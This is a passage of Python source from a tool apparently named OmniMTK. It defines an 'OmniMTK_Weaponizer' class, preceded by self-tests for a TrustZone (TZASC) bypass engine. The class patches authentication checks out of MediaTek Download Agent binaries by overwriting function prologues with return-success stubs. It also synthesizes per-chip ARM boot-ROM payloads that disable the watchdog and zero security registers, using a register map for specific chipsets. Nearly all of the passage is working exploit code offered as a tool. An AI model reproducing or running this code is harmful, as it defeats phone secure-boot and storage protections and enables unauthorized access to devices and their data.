    print(f"\n         ✓ All binary analyzer self-tests PASSED")

    # ── v9.6 TZASC BYPASS ENGINE SELF-TEST ───────────────────────────────
    print(f"\n[STEP 9] TZASCBypassEngine Self-Test (synthetic data)...")

    # Test UPG-01: MetadataPartitionAnalyzer hardware-wipe detection
    meta_zero = bytes(512)
    mz_res = MetadataPartitionAnalyzer.analyze(meta_zero)
    print(f"         MetadataPartitionAnalyzer (zero buffer):")
    print(f"           hardware_protected : {mz_res['hardware_protected']}")
    print(f"           protect_reason     : {mz_res['hardware_protect_reason']}")
    print(f"           encryption_state   : {mz_res['encryption_state']}")
    assert mz_res["hardware_protected"],  "FAIL: hardware_protected should be True for zero buffer"
    assert mz_res["encryption_state"] == "HARDWARE_WIPED_OR_PROTECTED", "FAIL: wrong state"
    print(f"           ✓ HARDWARE_WIPED_OR_PROTECTED correctly detected")

    # Test UPG-01: Deep scan — inject magic at sector 2 (offset 8192)
    # Fill first sector with non-zero/non-magic noise to avoid hardware-wipe trigger
    meta_sector = bytearray(8192 + 512)
    for i in range(0, 4096, 2):
        meta_sector[i] = 0xAB            # non-zero padding — avoids HARDWARE_WIPED check
    struct.pack_into("<I", meta_sector, 8192, 0x656D6B6F)   # okme at sector 2
    struct.pack_into("<I", meta_sector, 8196, 2)             # version
    struct.pack_into("<Q", meta_sector, 8200, 128)
    meta_sector[8192 + 0x10] = 0x02
    ms_res = MetadataPartitionAnalyzer.analyze(bytes(meta_sector))
    print(f"\n         MetadataPartitionAnalyzer (deep scan — magic at sector 2):")
    print(f"           magic_found       : {ms_res['magic_found']}")
    print(f"           magic_offset      : {ms_res.get('magic_offset')}")
    print(f"           deep_scan_sectors : {len(ms_res['deep_scan_sectors'])}")
    assert ms_res["magic_found"],            "FAIL: deep scan should find magic at offset 8192"
    assert ms_res["magic_offset"] == 8192,   "FAIL: wrong magic offset"
    print(f"           ✓ Deep sector boundary scan working correctly")

    # Test UPG-02: KeyRefugeAnalyzer TZASC detection (all-zeros)
    key_zero = bytes(1024)
    kz_res = KeyRefugeAnalyzer.analyze(key_zero)
    print(f"\n         KeyRefugeAnalyzer (zero buffer):")
    print(f"           tzasc_blocked  : {kz_res.get('tzasc_blocked')}")
    print(f"           tzasc_reason   : {kz_res.get('tzasc_reason','—')}")
    print(f"           assessment     : {kz_res['assessment']}")
    assert kz_res.get("tzasc_blocked"),                          "FAIL: tzasc_blocked should be True"
    assert kz_res["assessment"] == "TZASC_HARDWARE_READ_PROTECTED", "FAIL: wrong assessment"
    print(f"           ✓ TZASC_HARDWARE_READ_PROTECTED correctly detected")

    # Test UPG-03: TEEImageAnalyzer UUID scan (inject known UUID)
    uuid_bytes = bytes.fromhex("7E7B84C4C55E4C09B45B80FEA0EB5D00")
    tee_uuid = bytearray(b'\x7F\x45\x4C\x46') + b'\x00'*60 + b'TEEGRIS\x00' + uuid_bytes + b'\x00'*64
    tu_res = TEEImageAnalyzer.analyze(bytes(tee_uuid))
    print(f"\n         TEEImageAnalyzer (UUID scan):")
    print(f"           uuid_scan hits  : {len(tu_res.get('uuid_scan',[]))}")
    print(f"           keymaster method: {tu_res.get('keymaster_ta',{}).get('method','—')}")
    assert len(tu_res.get("uuid_scan",[])) > 0, "FAIL: UUID scan should find Keymaster TA UUID"
    print(f"           ✓ UUID-based TA scanner working correctly")

    # Test NEW-01: TZASCBypassEngine.generate_bypass_report
    bypass_ctx = {
        "chip_id":      "MT6877",
        "tzasc_reason": "ALL_ZEROS_TZASC_OR_BLANK",
        "ufs_lun":      5,
        "lba_start":    0,
        "lba_count":    16,
    }
    bp_res = TZASCBypassEngine.generate_bypass_report(bypass_ctx)
    print(f"\n         TZASCBypassEngine.generate_bypass_report:")
    print(f"           engine         : {bp_res['engine']}")
    print(f"           chip_id        : {bp_res['chip_id']}")
    batch_r10 = bp_res['path2_ufs_hci']['batch_read10_cdb']
    batch_r16 = bp_res['path2_ufs_hci']['batch_read16_cdb']
    print(f"           Read10 CDB     : {batch_r10}")
    print(f"           Read16 CDB     : {batch_r16}")
    print(f"           P1 status      : {bp_res['path1_ram_carver']['status']}")
    print(f"           P3 lk scan     : {bp_res['path3_smc_hook']['lk_scan_results'][0].get('status','?')}")
    assert bp_res["chip_id"] == "MT6877",   "FAIL: chip_id mismatch"
    assert batch_r10.startswith("28"),      "FAIL: Read(10) opcode should be 0x28"
    assert batch_r16.startswith("88"),      "FAIL: Read(16) opcode should be 0x88"
    print(f"           ✓ TZASCBypassEngine all paths generated successfully")

    print(f"\n         ✓ All v9.6 TZASC Bypass Engine self-tests PASSED")

    print(f"\n{sep}")
    print("  TEST COMPLETE — v9.7 Weaponized Execution Update Edition")
    print(sep)
    return True


# ═══════════════════════════════════════════════════════════════════════════
# v10.1 — OmniMTK_Weaponizer: Active Exploit Synthesizer & Micro-Emulator
# ═══════════════════════════════════════════════════════════════════════════

class OmniMTK_Weaponizer:
    """
    v11.2 Master Weaponizer — transforms OmniMTK from passive analyzer
    into an active exploit synthesizer and bare-metal emulator.
    Houses three engines:
      1. DAPatcherEngine      — Binary lobotomizer for MTK DA files.
      2. PayloadSynthesizer   — Dynamic per-hw_code BROM ROP builder.
      3. MicroEmulator_TEE    — Unicorn-based TrustZone SMC trapper.
    """

    # ── ARM32/ARM64 Opcode Constants ─────────────────────────────────────
    OP_ARM32_THUMB_MOV_R0_0 = bytes.fromhex("00 20")        # MOV R0, #0
    OP_ARM32_THUMB_BX_LR    = bytes.fromhex("70 47")        # BX LR
    OP_ARM32_THUMB_RET_TRUE = bytes.fromhex("00 20 70 47")  # MOV R0,#0 ; BX LR
    OP_ARM64_MOVZ_X0_0      = bytes.fromhex("00 00 80 D2")  # MOVZ X0, #0
    OP_ARM64_RET            = bytes.fromhex("C0 03 5F D6")  # RET
    OP_ARM64_RET_TRUE       = bytes.fromhex("00 00 80 D2 C0 03 5F D6")
    OP_ARM64_NOP            = bytes.fromhex("1F 20 03 D5")  # NOP

    # Known SLA/auth function name fragments in MTK DA binaries
    DA_AUTH_STRINGS = [b"SLA", b"sla", b"verify_auth", b"verify",
                       b"auth_token", b"download_agent_authorization",
                       b"DA_AUTH", b"SecureDownload"]

    # SRAM / Security Register maps per hw_code (research-approximated)
    # hw_code → (sram_base, sec_reg_offset, arch_hint)
    # Security register offsets from bypass research:
    #   Modern Dimensity/Helio G: 0x1000A000 (SLA/DAA disable)
    #   Legacy MT65xx/MT816x:      0x100A0000 (older SBC register)
    HWCODE_MAP = {
        0x766:  (0x00100000, 0x100A0000, "ARM64"),   # MT6765
        0x717:  (0x00100000, 0x100A0000, "ARM64"),   # MT6761/6762
        0x690:  (0x00100000, 0x100A0000, "ARM64"),   # MT6763
        0x813:  (0x00110000, 0x1000A000, "ARM64"),   # MT6781
        0x989:  (0x00110000, 0x1000A000, "ARM64"),   # MT6789 (Helio G99)
        0x878:  (0x00110000, 0x1000A000, "ARM64"),   # MT6877 (Dimensity 900)
        0x880:  (0x00110000, 0x1000A000, "ARM64"),   # MT6883/6885
        0x950:  (0x00110000, 0x1000A000, "ARM64"),   # MT6893
        0x9890: (0x00110000, 0x1000A000, "ARM64"),   # Dimensity 700
        0x995:  (0x00110000, 0x1000A000, "ARM64"),   # Dimensity 800U
        0x8163: (0x00100000, 0x100A0000, "ARM32"),   # MT8163
        0x8167: (0x00100000, 0x100A0000, "ARM32"),   # MT8516
    }

    class DAPatcherEngine:
        """
        v11.3 — Frankenstein DA Builder with Real XREF Resolution & MTK TOC Parsing.
        Web-search findings:
          • ARM64 strings are referenced via ADRP (opcode 0x90000000)
            followed by ADD/LDR. ADRP encodes a 21-bit signed offset
            shifted by 12; target = (PC & ~0xFFF) + (offset << 12).
          • ARM32 THUMB strings are referenced via LDR Rd,[PC,#imm8*4]
            (0x4800..0x4FFF) pointing to a literal pool.
          • We decode ADRP immlo/immhi in pure Python (no Capstone).
        """

        @classmethod
        def patch_da(cls, data: bytes, arch: str = "AUTO") -> dict:
            result = {
                "status":          "INIT",
                "original_size":   len(data),
                "patches_applied": 0,
                "patch_offsets":   [],
                "warnings":        [],
                "patched_data":    None,
            }
            # v13.0 FIX: 100MB rigid ceiling prevents accidental 256GB userdata.img hangs.
            MAX_DA_SIZE = 100 * 1024 * 1024
            if not data or len(data) < 64:
                result["status"] = "ERROR_TOO_SMALL"
                result["warnings"].append("DA binary < 64 bytes — cannot patch.")
                return result
            if len(data) > MAX_DA_SIZE:
                result["status"] = "FILE_TOO_LARGE"
                result["warnings"].append(
                    f"DA binary is {len(data):,} bytes (>100MB ceiling). "
                    f"A legitimate MTK DA container is never this large. "
                    f"You likely fed a userdata.img by mistake."
                )
                return result

            detected_arch = arch
            # v10.3 FIX: MTK_AllInOne_DA is a container — scan entire file for ELF.
            elf_info = cls._find_first_elf(data)
            # v10.4 FIX: Slice the ELF out of the container. ALL scanning and patching
            # MUST operate on elf_data only, or str_off will be an absolute container
            # offset instead of an ELF-relative offset, corrupting VMA calculations.
            elf_offset = elf_info[0] if elf_info else 0
            elf_data = data[elf_offset:]

            if detected_arch == "AUTO":
                if elf_info:
                    _, ei_class = elf_info
                    detected_arch = "ARM64" if ei_class == 2 else "ARM32"
                else:
                    detected_arch = cls._heuristic_arch(elf_data)

            result["detected_arch"] = detected_arch
            mutable_elf = bytearray(elf_data)

            # v10.3 FIX: Use first embedded ELF for base_addr, not just offset 0.
            base_addr = None
            if elf_info:
                base_addr = cls._extract_elf_base(data, elf_info[0])
            if base_addr is None:
                base_addr = 0x00200000  # common MTK DA load base for raw binaries
            result["base_addr"] = f"0x{base_addr:08X}"

            # v10.4 FIX: Pass ONLY the sliced elf_data to scanning functions.
            string_hits = cls._scan_auth_strings(elf_data)
            for hit in string_hits:
                # v10.2 FIX: resolve REAL xrefs using VMA (base_addr + offset)
                xref_offsets = cls._find_all_xrefs(elf_data, hit["offset"], detected_arch, base_addr)
                for xref_off in xref_offsets:
                    func_start = cls._find_function_prologue(elf_data, xref_off, detected_arch)
                    if func_start is not None:
                        patch = (OmniMTK_Weaponizer.OP_ARM64_RET_TRUE
                                 if detected_arch == "ARM64"
                                 else OmniMTK_Weaponizer.OP_ARM32_THUMB_RET_TRUE)
                        end = func_start + len(patch)
                        if end <= len(mutable_elf):
                            mutable_elf[func_start:end] = patch
                            result["patches_applied"] += 1
                            result["patch_offsets"].append({
                                "offset":     elf_offset + func_start,
                                "string":     hit["string"],
                                "arch":       detected_arch,
                                "patch_hex":  patch.hex(),
                                "xref_insn":  elf_offset + xref_off,
                            })
                        break  # patch only first prologue per string hit

            if result["patches_applied"] == 0:
                result["warnings"].append(
                    "No SLA/auth function prologue found via real XREF. "
                    "Manual analysis with IDA/Ghidra required."
                )
                result["status"] = "NO_PATCH_APPLIED"
            else:
                result["status"] = "PATCHED_OK"

            # v10.4 FIX: Reconstruct final binary: container prefix + patched ELF.
            result["patched_data"] = data[:elf_offset] + bytes(mutable_elf)
            return result

        @staticmethod
        def _heuristic_arch(data: bytes) -> str:
            aarch64_rets = data.count(bytes.fromhex("C0 03 5F D6"))
            thumb_bx_lr  = data.count(bytes.fromhex("70 47"))
            return "ARM64" if aarch64_rets > thumb_bx_lr else "ARM32"

        @staticmethod
        def _parse_mtk_toc(data: bytes) -> int | None:
            """
            v11.4 — Parse MTK AllInOne DA Table of Contents to locate the
            main ELF image offset. MTK DA containers start with the magic
            'MTK_DOWNLOAD_AGENT' followed by image entries (name, offset, size).
            Returns the offset of the first valid ARM/ARM64 ELF image,
            or None if the container lacks a TOC or parsing fails.
            v11.4 FIX: 64-byte buffer floor, 8-byte alignment fallback,
            and hardened exception wrapping for sec2024 containers.
            """
            if len(data) < 64:
                return None
            # v13.0: use slice comparison instead of startswith() for mmap compatibility
            if data[:18] != b"MTK_DOWNLOAD_AGENT":
                return None
            sig_len = len(b"MTK_DOWNLOAD_AGENT")  # 18
            scan_end = min(len(data), 4096)
            MIN_ELF_TAIL = 64  # v11.4: need 64 bytes after ELF start for valid parsing

            # Strategy 1: Look for aligned 4-byte offset+size pairs that
            # point to a valid \x7fELF header within the file bounds.
            for step in (4, 8):  # v11.4: try 4-byte then 8-byte alignment (sec2024)
                for o in range(sig_len, scan_end - 8, step):
                    try:
                        img_offset = struct.unpack_from("<I", data, o)[0]
                        img_size = struct.unpack_from("<I", data, o + 4)[0]
                    except struct.error:
                        continue
                    # v11.4 FIX: require 64 bytes of ELF header, not 52
                    if img_offset < sig_len or img_offset > len(data) - MIN_ELF_TAIL:
                        continue
                    if img_size < 1024 or img_size > len(data) - img_offset:
                        continue
                    if data[img_offset:img_offset + 4] == b"\x7fELF":
                        try:
                            ei_class = data[img_offset + 4]
                            e_machine = struct.unpack_from("<H", data, img_offset + 0x12)[0]
                            if ei_class in (1, 2) and e_machine in (0x28, 0xB7):
                                return img_offset
                        except (struct.error, IndexError):
                            continue

            # Strategy 2: Some MTK DAs have the ELF immediately after the
            # header with no formal TOC. Scan for \x7fELF shortly after sig.
            # v11.4: sec2024 containers often page-align at 0x200 boundaries.
            for align in (1, 0x200):
                start = sig_len if align == 1 else ((sig_len + align - 1) // align) * align
                for o in range(start, min(scan_end, len(data) - MIN_ELF_TAIL), align):
                    if data[o:o + 4] == b"\x7fELF":
                        try:
                            ei_class = data[o + 4]
                            e_machine = struct.unpack_from("<H", data, o + 0x12)[0]
                            if ei_class in (1, 2) and e_machine in (0x28, 0xB7):
                                return o
                        except (struct.error, IndexError):
                            continue
            return None

        @staticmethod
        def _find_first_elf(data: bytes) -> tuple | None:
            """
            v11.4 FIX: Try MTK TOC parsing FIRST (structured, exact offset).
            If the container lacks a TOC or parsing fails, fall back to the
            legacy blind linear search as an emergency fallback.
            v11.4: 64-byte buffer floor prevents passing near-EOF false
            positives to _extract_elf_base, which crashes on underread.
            Returns (offset, ei_class) or None.
            """
            # v13.0 FIX: Abort early if the container is absurdly large.
            MAX_DA_SIZE = 100 * 1024 * 1024
            if len(data) > MAX_DA_SIZE:
                raise ValueError(
                    f"DA container is {len(data):,} bytes (>100MB ceiling). "
                    f"Refusing to scan what is probably a userdata.img."
                )
            MIN_ELF_TAIL = 64
            # Attempt 1: MTK AllInOne DA TOC parsing (structured, non-blind)
            toc_offset = OmniMTK_Weaponizer.DAPatcherEngine._parse_mtk_toc(data)
            if toc_offset is not None and toc_offset + MIN_ELF_TAIL <= len(data):
                try:
                    ei_class = data[toc_offset + 4]
                    return toc_offset, ei_class
                except IndexError:
                    pass

            # Attempt 2: Blind linear search (emergency fallback only)
            off = 0
            while True:
                idx = data.find(b"\x7fELF", off)
                if idx == -1:
                    break
                # v11.4 FIX: require 64 bytes of valid ELF buffer, not 52
                if len(data) - idx < MIN_ELF_TAIL:
                    off = idx + 1
                    continue
                try:
                    ei_class = data[idx + 4]
                    if ei_class not in (1, 2):
                        off = idx + 1
                        continue
                    e_machine = struct.unpack_from("<H", data, idx + 0x12)[0]
                    if e_machine in (0x28, 0xB7):
                        return idx, ei_class
                except (struct.error, IndexError):
                    pass
                off = idx + 1
            return None

        @staticmethod
        def _extract_elf_base(data: bytes, elf_offset: int = 0) -> int | None:
            """v11.4 FIX: Extract minimum p_vaddr from PT_LOAD at elf_offset.
            Hardened against corrupted ELF headers, zero-base PIE binaries,
            insane e_phnum values, and near-EOF underreads (64-byte floor).
            Every struct.unpack is individually wrapped so ONE bad field
            returns None instead of crashing the entire suite.
            """
            # v11.4 FIX: 64 bytes minimum for ELF64 fields up to 0x38 + margin
            if len(data) < elf_offset + 64:
                return None
            try:
                ei_class = data[elf_offset + 4]
            except IndexError:
                return None
            try:
                if ei_class == 2:  # ELF64
                    e_phoff = struct.unpack_from("<Q", data, elf_offset + 0x20)[0]
                    e_phentsize = struct.unpack_from("<H", data, elf_offset + 0x36)[0]
                    e_phnum = struct.unpack_from("<H", data, elf_offset + 0x38)[0]
                    p_vaddr_off = 0x10
                    fmt = "<Q"
                else:  # ELF32
                    e_phoff = struct.unpack_from("<I", data, elf_offset + 0x1C)[0]
                    e_phentsize = struct.unpack_from("<H", data, elf_offset + 0x2A)[0]
                    e_phnum = struct.unpack_from("<H", data, elf_offset + 0x2C)[0]
                    p_vaddr_off = 0x08
                    fmt = "<I"
            except struct.error:
                return None
            # v11.0: cap e_phnum to prevent runaway loops on malformed ELF
            MAX_PHNUM = 256
            if e_phnum > MAX_PHNUM or e_phnum == 0:
                return None
            # v11.0: sanity-check e_phoff within file bounds
            if elf_offset + e_phoff + (e_phnum * e_phentsize) > len(data):
                return None
            min_base = None
            for i in range(e_phnum):
                ph_start = elf_offset + e_phoff + (i * e_phentsize)
                if ph_start + p_vaddr_off + 8 > len(data):
                    break
                try:
                    p_type = struct.unpack_from("<I", data, ph_start)[0]
                except struct.error:
                    break
                if p_type == 1:  # PT_LOAD
                    try:
                        p_vaddr = struct.unpack_from(fmt, data, ph_start + p_vaddr_off)[0]
                    except struct.error:
                        break
                    if min_base is None or p_vaddr < min_base:
                        min_base = p_vaddr
            # v11.0 Zero-Base ELF Guard: reject PIE binaries with p_vaddr==0
            if min_base is None or min_base < 0x1000:
                return None
            return min_base

        @staticmethod
        def _scan_auth_strings(data: bytes) -> list:
            hits = []
            for frag in OmniMTK_Weaponizer.DA_AUTH_STRINGS:
                off = 0
                while True:
                    idx = data.find(frag, off)
                    if idx == -1:
                        break
                    hits.append({"offset": idx, "string": frag.decode("ascii", errors="ignore")})
                    off = idx + len(frag)
            return hits

        # ── ARM64 ADRP decoder (pure Python) ──────────────────────────────
        @staticmethod
        def _decode_adrp_target(pc: int, insn: int) -> int:
            """Decode ARM64 ADRP target address. pc MUST be a VMA."""
            # ADRP: 1 0 0 1 | immlo(2) | Rd(5) | immhi(19)
            immlo = (insn >> 29) & 0x3
            immhi = (insn >> 5) & 0x7FFFF
            imm = (immhi << 2) | immlo
            # sign-extend 21-bit
            if imm & (1 << 20):
                imm -= (1 << 21)
            return (pc & ~0xFFF) + (imm << 12)

        @staticmethod
        def _is_add_imm64_target(insn: int, target_lo: int) -> bool:
            """Check if ADD Xd, Xn, #imm12 produces target_lo when base is page-aligned."""
            if (insn & 0xFF000000) != 0x91000000:
                return False
            shift = (insn >> 22) & 0x3
            imm12 = (insn >> 10) & 0xFFF
            if shift == 0:
                return imm12 == target_lo
            if shift == 1:
                return (imm12 << 12) == target_lo
            return False

        @staticmethod
        def _is_ldr_uimm32_target(insn: int, target_lo: int) -> bool:
            """Check if LDR Wt, [Xn, #imm12*4] points to target_lo offset."""
            if (insn & 0xFFC00000) != 0xB9400000:
                return False
            imm12 = (insn >> 10) & 0xFFF
            return (imm12 << 2) == target_lo

        @staticmethod
        def _find_all_xrefs(data: bytes, str_off: int, arch: str, base_addr: int = 0) -> list:
            """
            v11.0 FIX: Hardened against struct.error and negative scan limits.
            str_off  = file offset of the string within the binary.
            base_addr = runtime load base (extracted from ELF or assumed).
            """
            xrefs = []
            data_len = len(data)
            v_str = base_addr + str_off  # virtual address of the string

            if arch == "ARM64":
                target_page = v_str & ~0xFFF
                # v13.0: scan the ENTIRE file, no 1MB blindspot.
                # mmap-backed data is safe to traverse fully.
                scan_limit = data_len - 8
                if scan_limit <= 0:
                    return xrefs
                for o in range(0, scan_limit, 4):
                    try:
                        insn = struct.unpack_from("<I", data, o)[0]
                    except struct.error:
                        break
                    if (insn & 0x9F000000) == 0x90000000:
                        v_pc = base_addr + o  # v10.2: VMA, not raw file offset
                        decoded_page = OmniMTK_Weaponizer.DAPatcherEngine._decode_adrp_target(v_pc, insn)
                        if decoded_page == target_page:
                            try:
                                next_insn = struct.unpack_from("<I", data, o + 4)[0]
                            except struct.error:
                                break
                            if (OmniMTK_Weaponizer.DAPatcherEngine._is_add_imm64_target(next_insn, v_str & 0xFFF) or
                                OmniMTK_Weaponizer.DAPatcherEngine._is_ldr_uimm32_target(next_insn, v_str & 0xFFF)):
                                xrefs.append(o)
                # Absolute 32-bit pointer fallback: search for virtual address
                target_bytes = struct.pack("<I", v_str)
                off = 0
                while True:
                    idx = data.find(target_bytes, off)
                    if idx == -1:
                        break
                    if idx % 4 == 0:
                        xrefs.append(idx)
                    off = idx + 4
            else:
                # ARM32 THUMB: literal pool pointers are usually file offsets
                # because THUMB LDR PC-relative is offset-based, not VMA-based.
                target_bytes = struct.pack("<I", str_off)
                off = 0
                while True:
                    idx = data.find(target_bytes, off)
                    if idx == -1:
                        break
                    if idx % 4 == 0:
                        search_start = max(0, idx - 1024)
                        found_ldr = False
                        for ldr_o in range(search_start, idx, 2):
                            if ldr_o + 2 > data_len:
                                continue
                            b0, b1 = data[ldr_o], data[ldr_o + 1]
                            if (b1 & 0xF8) == 0x48:
                                imm8 = b0 | ((b1 & 0x07) << 8)
                                pc_align = (ldr_o + 4) & ~3
                                if pc_align + (imm8 * 4) == idx:
                                    xrefs.append(ldr_o)
                                    found_ldr = True
                                    break
                        if not found_ldr:
                            xrefs.append(idx)
                    off = idx + 4
            return xrefs

        @staticmethod
        def _find_function_prologue(data: bytes, near_offset: int, arch: str) -> int | None:
            """Walk backwards from xref instruction to locate function prologue."""
            if arch == "ARM64":
                search_start = max(0, near_offset - 512)
                for o in range(near_offset, search_start, -4):
                    if o + 4 > len(data):
                        continue
                    insn = data[o:o+4]
                    # STP X29, X30, [SP, #...]  → 0xFD 7B xx xx
                    if insn[0:1] == b"\xfd" and insn[1:2] == b"\x7b":
                        return o
                    # SUB SP, SP, #... → 0xFF 83 / 0xFF 43
                    if insn[0:1] == b"\xff" and (insn[1:2] == b"\x83" or insn[1:2] == b"\x43"):
                        return o
                return None
            else:
                search_start = max(0, near_offset - 256)
                for o in range(near_offset, search_start, -2):
                    if o + 2 > len(data):
                        continue
                    insn = data[o:o+2]
                    if insn == b"\x00\xb5" or insn == b"\xf0\xb5":
                        return o
                return None

    class PayloadSynthesizer:
        """
        Dynamic BROM exploit payload builder.
        Stops relying on static kamakiri .bin files.
        """

        @classmethod
        def generate_brom_exploit(cls, hw_code: int, arch: str = "AUTO",
                                  hcm: HardwareCapabilityMatrix = None) -> dict:
            result = {
                "status":       "INIT",
                "hw_code":      f"0x{hw_code:04X}",
                "arch":         arch,
                "payload_hex":  "",
                "payload_len":  0,
                "watchdog_write": None,
                "target_sram":  None,
                "notes":        [],
            }

            entry = OmniMTK_Weaponizer.HWCODE_MAP.get(hw_code)
            if entry is None:
                # Unknown hw_code — build generic ARM64 payload anyway
                sram_base = 0x00100000
                sec_reg   = 0x1020A0C
                fallback_arch = "ARM64"
                result["notes"].append(
                    f"hw_code 0x{hw_code:04X} not in HWCODE_MAP. "
                    "Using generic ARM64 payload — verify offsets with scatter file!"
                )
            else:
                sram_base, sec_reg, fallback_arch = entry

            # v12.2: HCM-aware execution pruning — physically bypass incompatible
            # payload architecture when HCM has proven TEE type from hard binary.
            if arch == "AUTO":
                if hcm is not None and hcm.tee_type == TEEType.KINIBI:
                    # Kinibi-era Samsung MTK (pre-2020) → conservative ARM32 boot chain
                    arch = "ARM32"
                    result["notes"].append(
                        "HCM tee_type=KINIBI — forcing ARM32 payload; "
                        "skipping ARM64 branch for older Trustonic boot chain"
                    )
                elif hcm is not None and hcm.tee_type == TEEType.TEEGRIS:
                    # TEEGRIS-era Samsung MTK (2020+) → ARM64 boot chain
                    arch = "ARM64"
                    result["notes"].append(
                        "HCM tee_type=TEEGRIS — forcing ARM64 payload; "
                        "skipping ARM32 branch for modern Samsung boot chain"
                    )
                else:
                    arch = fallback_arch

            result["arch"] = arch
            result["target_sram"] = f"0x{sram_base:08X}"

            # Build dynamic payload
            if arch == "ARM64":
                payload = cls._build_arm64_payload(sram_base, sec_reg)
            else:
                payload = cls._build_arm32_payload(sram_base, sec_reg)

            result["payload_hex"] = payload.hex()
            result["payload_len"] = len(payload)
            result["watchdog_write"] = {
                "address": "0x10007000",  # common MTK WDT base (varies by chip)
                "value":   "0x22000064",
            }
            result["status"] = "SYNTHESIZED"
            return result

        @staticmethod
        def _encode_arm64_movz(rd: int, imm16: int, hw: int = 0) -> bytes:
            return struct.pack("<I", 0xD2800000 | (hw << 21) | (imm16 << 5) | rd)

        @staticmethod
        def _encode_arm64_movk(rd: int, imm16: int, hw: int = 0) -> bytes:
            return struct.pack("<I", 0xF2800000 | (hw << 21) | (imm16 << 5) | rd)

        @staticmethod
        def _encode_arm64_str_w(rt: int, rn: int, imm12: int = 0) -> bytes:
            """STR Wt, [Xn, #imm12] — 32-bit store. MANDATORY for MTK MMIO."""
            return struct.pack("<I", 0xB9000000 | ((imm12 & 0xFFF) << 10) | (rn << 5) | rt)

        @staticmethod
        def _encode_arm64_str_x(rt: int, rn: int, imm12: int = 0) -> bytes:
            """STR Xt, [Xn, #imm12] — 64-bit store.
            WARNING: DO NOT use for 32-bit MMIO registers (APB/AHB bus).
            A 64-bit STR to a 32-bit peripheral triggers Synchronous External Abort.
            """
            return struct.pack("<I", 0xF9000000 | ((imm12 & 0xFFF) << 10) | (rn << 5) | rt)

        @staticmethod
        def _build_arm64_payload(sram_base: int, sec_reg: int) -> bytes:
            """
            v11.2 — AArch64 ROP-ish stub that ACTUALLY writes to sec_reg.
            Part A: WDT disable + Security Register lobotomy.
            Part B: UFSHCI Controller bring-up using STRICTLY 32-bit MMIO.
            """
            stub = bytearray()

            # ── Part A: WDT + Security Register ──────────────────────────
            # WDT base = 0x10007000
            stub += bytes.fromhex("00 00 82 D2")   # MOVZ X0, #0x1000, LSL #16
            stub += bytes.fromhex("00 00 A0 F2")   # MOVK X0, #0x7000
            # WDT value = 0x22000064
            stub += bytes.fromhex("81 00 80 D2")   # MOVZ X1, #0x0064, LSL #16
            stub += bytes.fromhex("81 00 A8 F2")   # MOVK X1, #0x2200
            # STR W1, [X0]  → kill watchdog (32-bit MMIO — safe)
            stub += bytes.fromhex("01 00 00 B9")   # STR W1, [X0]

            # Load sec_reg into X4
            sec_reg_hi = (sec_reg >> 16) & 0xFFFF
            sec_reg_lo = sec_reg & 0xFFFF
            stub += OmniMTK_Weaponizer.PayloadSynthesizer._encode_arm64_movz(4, sec_reg_hi, 1)
            stub += OmniMTK_Weaponizer.PayloadSynthesizer._encode_arm64_movk(4, sec_reg_lo, 0)
            # MOVZ X2, #0  → value to clear security bit
            stub += bytes.fromhex("02 00 80 D2")   # MOVZ X2, #0
            # STR W2, [X4]  → ACTUALLY WRITE TO SECURITY REGISTER
            stub += OmniMTK_Weaponizer.PayloadSynthesizer._encode_arm64_str_w(2, 4, 0)

            # v10.2 FIX: Memory barriers
            stub += bytes.fromhex("9F 30 03 D5")   # DSB SY
            stub += bytes.fromhex("DF 30 03 D5")   # ISB

            # ── Part B: UFSHCI Bring-Up (v10.8 DMA Sync + JEDEC + DMA Coherency) ──
            # MTK APB/AHB peripheral bus is strictly 32-bit.
            # A 64-bit STR Xn to a 32-bit MMIO register triggers a
            # Synchronous External Abort (Bus Error), killing the SoC.
            # We use STR Wn (32-bit) exclusively for all UFSHCI MMIO.
            # UFSHCI base = 0x112B0000
            stub += bytes.fromhex("65 52 A2 D2")   # MOVZ X5, #0x112B, LSL #16
            # UTRLBA lower 32-bits (0x00120000) → W6
            stub += bytes.fromhex("46 02 A2 D2")   # MOVZ X6, #0x0012, LSL #16
            # STR W6, [X5, #0x50] → UTRLBA low  (offset 0x50 / 4 = 0x14)
            stub += bytes.fromhex("A6 50 00 B9")   # STR W6, [X5, #0x50]
            # UTRLBA upper 32-bits (0x00000000) → W7
            stub += bytes.fromhex("07 00 80 D2")   # MOVZ X7, #0
            # STR W7, [X5, #0x54] → UTRLBA high (offset 0x54 / 4 = 0x15)
            stub += bytes.fromhex("A7 54 00 B9")   # STR W7, [X5, #0x54]
            # Doorbell = 1 → W8
            stub += bytes.fromhex("08 00 80 52")   # MOVZ W8, #1
            # STR W8, [X5, #0x58] → UDOORBS (offset 0x58 / 4 = 0x16)
            stub += bytes.fromhex("A8 58 00 B9")   # STR W8, [X5, #0x58]
            # Run/Stop = 1 → W9
            stub += bytes.fromhex("09 00 80 52")   # MOVZ W9, #1
            # STR W9, [X5, #0x60] → URUN (offset 0x60 / 4 = 0x18)
            stub += bytes.fromhex("A9 60 00 B9")   # STR W9, [X5, #0x60]

            # ── Success marker ────────────────────────────────────────────
            stub += bytes.fromhex("43 74 84 D2")   # MOVZ X3, #0xA3A2
            stub += bytes.fromhex("43 74 A4 F2")   # MOVK X3, #0xA1A0
            # STR W3, [X0, #0x100]  → SRAM+0x100 (offset 0x100 / 4 = 0x40)
            # v10.3 FIX: corrected hex from 03 08 00 B9 (was #0x20) to 03 00 01 B9 (#0x100)
            stub += bytes.fromhex("03 00 01 B9")   # STR W3, [X0, #0x100]
            # RET
            stub += bytes.fromhex("C0 03 5F D6")
            return bytes(stub)

        @staticmethod
        def _build_arm32_payload(sram_base: int, sec_reg: int) -> bytes:
            """v11.2 — ARM32 THUMB stub with LDR R4, =sec_reg + STR."""
            stub = bytearray()
            # LDR R0, [PC, #16]  → WDT base @ offset 20
            stub += bytes.fromhex("04 48")
            # LDR R1, [PC, #20]  → WDT value @ offset 24
            stub += bytes.fromhex("05 49")
            # LDR R4, [PC, #20]  → sec_reg @ offset 28  (PC-align=8, 8+20=28)
            stub += bytes.fromhex("05 4C")
            # STR R1, [R0]
            stub += bytes.fromhex("01 60")
            # MOVS R2, #0
            stub += bytes.fromhex("00 22")
            # STR R2, [R4, #0]  → 0x6042 in LE
            stub += bytes.fromhex("42 60")
            # MOVS R3, #0xA1
            stub += bytes.fromhex("A1 23")
            # STR R3, [R0, #0x40]  → imm5=16, Rn=0, Rt=3  → 0x6403
            stub += bytes.fromhex("03 64")
            # BX LR
            stub += bytes.fromhex("70 47")
            # Padding to align literal pool
            stub += bytes.fromhex("00 00")
            # Literal pool (offset 20)
            stub += struct.pack("<I", 0x10007000)  # WDT base
